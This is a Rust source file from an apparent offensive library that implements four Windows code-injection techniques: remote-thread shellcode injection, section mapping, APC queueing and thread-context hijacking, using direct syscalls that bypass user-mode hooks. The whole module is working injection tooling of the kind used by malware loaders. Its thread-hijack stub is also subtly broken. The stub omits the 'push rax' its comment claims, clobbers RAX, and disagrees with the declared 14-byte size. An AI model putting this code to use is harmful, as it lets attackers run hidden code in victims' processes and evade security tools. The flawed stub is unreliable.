//! Injection methods for remote processes
//!
//! Provides various techniques for code injection:
//! - CreateRemoteThread (shellcode/DLL injection)
//! - NtMapViewOfSection (section mapping)
//! - APC injection (queue user APC)
//! - Thread hijacking (context manipulation)

use super::process::RemoteProcess;
use super::thread::{create_remote_thread, RemoteThreadOptions};
use crate::error::{Result, WraithError};
use crate::manipulation::syscall::{
    get_syscall_table, nt_close, nt_success, DirectSyscall,
    PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_READWRITE,
};

/// injection method enumeration
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum InjectionMethod {
    /// CreateRemoteThread with shellcode
    RemoteThread,
    /// NtMapViewOfSection
    SectionMapping,
    /// QueueUserAPC
    Apc,
    /// Thread context hijacking
    ThreadHijack,
}

/// result of a successful injection
#[derive(Debug)]
pub struct InjectionResult {
    pub method: InjectionMethod,
    pub remote_address: usize,
    pub thread_id: Option<u32>,
    pub size: usize,
}

/// inject shellcode via remote thread creation
pub fn inject_shellcode(
    process: &RemoteProcess,
    shellcode: &[u8],
) -> Result<InjectionResult> {
    // allocate memory for shellcode
    let alloc = process.allocate_rw(shellcode.len())?;

    // write shellcode
    process.write(alloc.base(), shellcode)?;

    // change to RX
    process.protect(alloc.base(), alloc.size(), PAGE_EXECUTE_READ)?;

    // create remote thread
    let thread = create_remote_thread(
        process,
        alloc.base(),
        0,
        RemoteThreadOptions::default(),
    )?;

    let base = alloc.leak(); // don't free, thread is using it

    Ok(InjectionResult {
        method: InjectionMethod::RemoteThread,
        remote_address: base,
        thread_id: Some(thread.id()),
        size: shellcode.len(),
    })
}

/// inject via NtMapViewOfSection
pub fn inject_via_section(
    process: &RemoteProcess,
    data: &[u8],
    executable: bool,
) -> Result<InjectionResult> {
    // create section
    let section_handle = create_section(data.len(), executable)?;

    // map section into current process to write data
    let local_base = map_section_local(section_handle, data.len())?;

    // copy data to section
    unsafe {
        core::ptr::copy_nonoverlapping(
            data.as_ptr(),
            local_base as *mut u8,
            data.len(),
        );
    }

    // unmap from current process
    unmap_section_local(local_base)?;

    // map section into remote process
    let remote_base = map_section_remote(process, section_handle, data.len(), executable)?;

    // close section handle
    let _ = nt_close(section_handle);

    Ok(InjectionResult {
        method: InjectionMethod::SectionMapping,
        remote_address: remote_base,
        thread_id: None,
        size: data.len(),
    })
}

fn create_section(size: usize, executable: bool) -> Result<usize> {
    let table = get_syscall_table()?;
    let syscall = DirectSyscall::from_table(table, "NtCreateSection")?;

    let mut section_handle: usize = 0;
    let mut max_size: i64 = size as i64;

    let protection = if executable {
        PAGE_EXECUTE_READWRITE
    } else {
        PAGE_READWRITE
    };

    // SAFETY: all parameters are valid
    let status = unsafe {
        syscall.call_many(&[
            &mut section_handle as *mut usize as usize, // SectionHandle
            SECTION_ALL_ACCESS as usize,                 // DesiredAccess
            0,                                           // ObjectAttributes
            &mut max_size as *mut i64 as usize,          // MaximumSize
            protection as usize,                         // SectionPageProtection
            SEC_COMMIT as usize,                         // AllocationAttributes
            0,                                           // FileHandle
        ])
    };

    if nt_success(status) {
        Ok(section_handle)
    } else {
        Err(WraithError::SectionMappingFailed {
            reason: format!("NtCreateSection failed: {:#x}", status as u32),
        })
    }
}

fn map_section_local(section_handle: usize, size: usize) -> Result<usize> {
    let table = get_syscall_table()?;
    let syscall = DirectSyscall::from_table(table, "NtMapViewOfSection")?;

    let mut base_address: usize = 0;
    let mut view_size: usize = size;
    let current_process: usize = usize::MAX; // pseudo handle for current process

    // SAFETY: mapping into current process
    let status = unsafe {
        syscall.call_many(&[
            section_handle,
            current_process,
            &mut base_address as *mut usize as usize,
            0, // ZeroBits
            0, // CommitSize
            0, // SectionOffset
            &mut view_size as *mut usize as usize,
            2, // ViewUnmap
            0, // AllocationType
            PAGE_READWRITE as usize,
        ])
    };

    if nt_success(status) {
        Ok(base_address)
    } else {
        Err(WraithError::SectionMappingFailed {
            reason: format!("NtMapViewOfSection (local) failed: {:#x}", status as u32),
        })
    }
}

fn unmap_section_local(base_address: usize) -> Result<()> {
    let table = get_syscall_table()?;
    let syscall = DirectSyscall::from_table(table, "NtUnmapViewOfSection")?;

    let current_process: usize = usize::MAX;

    let status = unsafe { syscall.call2(current_process, base_address) };

    if nt_success(status) {
        Ok(())
    } else {
        Err(WraithError::SectionMappingFailed {
            reason: format!("NtUnmapViewOfSection failed: {:#x}", status as u32),
        })
    }
}

fn map_section_remote(
    process: &RemoteProcess,
    section_handle: usize,
    size: usize,
    executable: bool,
) -> Result<usize> {
    let table = get_syscall_table()?;
    let syscall = DirectSyscall::from_table(table, "NtMapViewOfSection")?;

    let mut base_address: usize = 0;
    let mut view_size: usize = size;

    let protection = if executable {
        PAGE_EXECUTE_READ
    } else {
        PAGE_READWRITE
    };

    // SAFETY: mapping into remote process
    let status = unsafe {
        syscall.call_many(&[
            section_handle,
            process.handle(),
            &mut base_address as *mut usize as usize,
            0, // ZeroBits
            0, // CommitSize
            0, // SectionOffset
            &mut view_size as *mut usize as usize,
            2, // ViewUnmap
            0, // AllocationType
            protection as usize,
        ])
    };

    if nt_success(status) {
        Ok(base_address)
    } else {
        Err(WraithError::SectionMappingFailed {
            reason: format!("NtMapViewOfSection (remote) failed: {:#x}", status as u32),
        })
    }
}

/// inject via APC (Asynchronous Procedure Call)
///
/// requires a thread handle with appropriate access rights
pub fn inject_apc(
    process: &RemoteProcess,
    thread_handle: usize,
    shellcode: &[u8],
) -> Result<InjectionResult> {
    // allocate and write shellcode
    let alloc = process.allocate_rw(shellcode.len())?;
    process.write(alloc.base(), shellcode)?;
    process.protect(alloc.base(), alloc.size(), PAGE_EXECUTE_READ)?;

    // queue APC
    queue_user_apc(thread_handle, alloc.base(), 0)?;

    let base = alloc.leak();

    Ok(InjectionResult {
        method: InjectionMethod::Apc,
        remote_address: base,
        thread_id: None,
        size: shellcode.len(),
    })
}

fn queue_user_apc(thread_handle: usize, apc_routine: usize, argument: usize) -> Result<()> {
    let table = get_syscall_table()?;
    let syscall = DirectSyscall::from_table(table, "NtQueueApcThread")?;

    // SAFETY: valid thread handle and APC routine
    let status = unsafe {
        syscall.call5(
            thread_handle,
            apc_routine,
            argument,
            0, // ApcContext1
            0, // ApcContext2
        )
    };

    if nt_success(status) {
        Ok(())
    } else {
        Err(WraithError::ApcQueueFailed {
            reason: format!("NtQueueApcThread failed: {:#x}", status as u32),
        })
    }
}

/// inject via thread hijacking (context manipulation)
///
/// suspends target thread, modifies its context to execute shellcode,
/// then resumes it
pub fn inject_thread_hijack(
    process: &RemoteProcess,
    thread_handle: usize,
    shellcode: &[u8],
) -> Result<InjectionResult> {
    // suspend thread
    let suspend_count = unsafe { SuspendThread(thread_handle) };
    if suspend_count == u32::MAX {
        return Err(WraithError::ThreadSuspendResumeFailed {
            reason: "SuspendThread failed".into(),
        });
    }

    // allocate memory for shellcode + saved context restoration stub
    let total_size = shellcode.len() + get_context_restore_stub_size();
    let alloc = process.allocate_rwx(total_size)?;

    // get current thread context
    let mut context = get_thread_context(thread_handle)?;

    // write shellcode
    process.write(alloc.base(), shellcode)?;

    // save original RIP and modify context
    #[cfg(target_arch = "x86_64")]
    let original_rip = context.rip;
    #[cfg(target_arch = "x86")]
    let original_rip = context.eip;

    // write restoration stub after shellcode
    let stub_offset = shellcode.len();
    let restore_stub = create_context_restore_stub(original_rip as usize);
    process.write(alloc.base() + stub_offset, &restore_stub)?;

    // modify context to point to our shellcode
    #[cfg(target_arch = "x86_64")]
    {
        context.rip = alloc.base() as u64;
    }
    #[cfg(target_arch = "x86")]
    {
        context.eip = alloc.base() as u32;
    }

    // set modified context
    set_thread_context(thread_handle, &context)?;

    // resume thread
    let resume_result = unsafe { ResumeThread(thread_handle) };
    if resume_result == u32::MAX {
        return Err(WraithError::ThreadSuspendResumeFailed {
            reason: "ResumeThread failed".into(),
        });
    }

    let base = alloc.leak();

    Ok(InjectionResult {
        method: InjectionMethod::ThreadHijack,
        remote_address: base,
        thread_id: None,
        size: total_size,
    })
}

#[cfg(target_arch = "x86_64")]
fn get_context_restore_stub_size() -> usize {
    // push rax; mov rax, <addr>; jmp rax = 2 + 10 + 2 = 14 bytes
    14
}

#[cfg(target_arch = "x86")]
fn get_context_restore_stub_size() -> usize {
    // push eax; mov eax, <addr>; jmp eax = 1 + 5 + 2 = 8 bytes
    8
}

#[cfg(target_arch = "x86_64")]
fn create_context_restore_stub(return_address: usize) -> Vec<u8> {
    let mut stub = Vec::with_capacity(14);
    // mov rax, <address>
    stub.push(0x48);
    stub.push(0xB8);
    stub.extend_from_slice(&(return_address as u64).to_le_bytes());
    // jmp rax
    stub.push(0xFF);
    stub.push(0xE0);
    stub
}

#[cfg(target_arch = "x86")]
fn create_context_restore_stub(return_address: usize) -> Vec<u8> {
    let mut stub = Vec::with_capacity(8);
    // mov eax, <address>
    stub.push(0xB8);
    stub.extend_from_slice(&(return_address as u32).to_le_bytes());
    // jmp eax
    stub.push(0xFF);
    stub.push(0xE0);
    stub
}

#[cfg(target_arch = "x86_64")]
#[repr(C, align(16))]
struct ThreadContext {
    p1_home: u64,
    p2_home: u64,
    p3_home: u64,
    p4_home: u64,
    p5_home: u64,
    p6_home: u64,
    context_flags: u32,
    mx_csr: u32,
    seg_cs: u16,
    seg_ds: u16,
    seg_es: u16,
    seg_fs: u16,
    seg_gs: u16,
    seg_ss: u16,
    eflags: u32,
    dr0: u64,
    dr1: u64,
    dr2: u64,
    dr3: u64,
    dr6: u64,
    dr7: u64,
    rax: u64,
    rcx: u64,
    rdx: u64,
    rbx: u64,
    rsp: u64,
    rbp: u64,
    rsi: u64,
    rdi: u64,
    r8: u64,
    r9: u64,
    r10: u64,
    r11: u64,
    r12: u64,
    r13: u64,
    r14: u64,
    r15: u64,
    rip: u64,
    // remaining fields for FPU/XMM state (we don't need to modify these)
    _padding: [u8; 512],
}

#[cfg(target_arch = "x86")]
#[repr(C)]
struct ThreadContext {
    context_flags: u32,
    dr0: u32,
    dr1: u32,
    dr2: u32,
    dr3: u32,
    dr6: u32,
    dr7: u32,
    float_save: [u8; 112],
    seg_gs: u32,
    seg_fs: u32,
    seg_es: u32,
    seg_ds: u32,
    edi: u32,
    esi: u32,
    ebx: u32,
    edx: u32,
    ecx: u32,
    eax: u32,
    ebp: u32,
    eip: u32,
    seg_cs: u32,
    eflags: u32,
    esp: u32,
    seg_ss: u32,
    _extended: [u8; 512],
}

#[cfg(target_arch = "x86_64")]
const CONTEXT_FULL: u32 = 0x10000B;
#[cfg(target_arch = "x86")]
const CONTEXT_FULL: u32 = 0x1000B;

fn get_thread_context(thread_handle: usize) -> Result<ThreadContext> {
    let mut context: ThreadContext = unsafe { core::mem::zeroed() };
    context.context_flags = CONTEXT_FULL;

    let result = unsafe { GetThreadContext(thread_handle, &mut context) };
    if result == 0 {
        return Err(WraithError::ThreadContextFailed {
            reason: format!("GetThreadContext failed: {}", unsafe { GetLastError() }),
        });
    }

    Ok(context)
}

fn set_thread_context(thread_handle: usize, context: &ThreadContext) -> Result<()> {
    let result = unsafe { SetThreadContext(thread_handle, context) };
    if result == 0 {
        return Err(WraithError::ThreadContextFailed {
            reason: format!("SetThreadContext failed: {}", unsafe { GetLastError() }),
        });
    }
    Ok(())
}

// section access rights
const SECTION_ALL_ACCESS: u32 = 0xF001F;
const SEC_COMMIT: u32 = 0x8000000;

#[link(name = "kernel32")]
extern "system" {
    fn SuspendThread(hThread: usize) -> u32;
    fn ResumeThread(hThread: usize) -> u32;
    fn GetThreadContext(hThread: usize, lpContext: *mut ThreadContext) -> i32;
    fn SetThreadContext(hThread: usize, lpContext: *const ThreadContext) -> i32;
    fn GetLastError() -> u32;
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_context_restore_stub() {
        let stub = create_context_restore_stub(0x12345678);
        assert!(!stub.is_empty());

        #[cfg(target_arch = "x86_64")]
        {
            assert_eq!(stub.len(), 12); // movabs + jmp
            assert_eq!(stub[0], 0x48); // REX.W prefix
            assert_eq!(stub[1], 0xB8); // MOV RAX, imm64
        }
    }

    #[test]
    fn test_injection_method_enum() {
        let method = InjectionMethod::RemoteThread;
        assert_eq!(method, InjectionMethod::RemoteThread);

        let method = InjectionMethod::SectionMapping;
        assert_eq!(method, InjectionMethod::SectionMapping);
    }
}
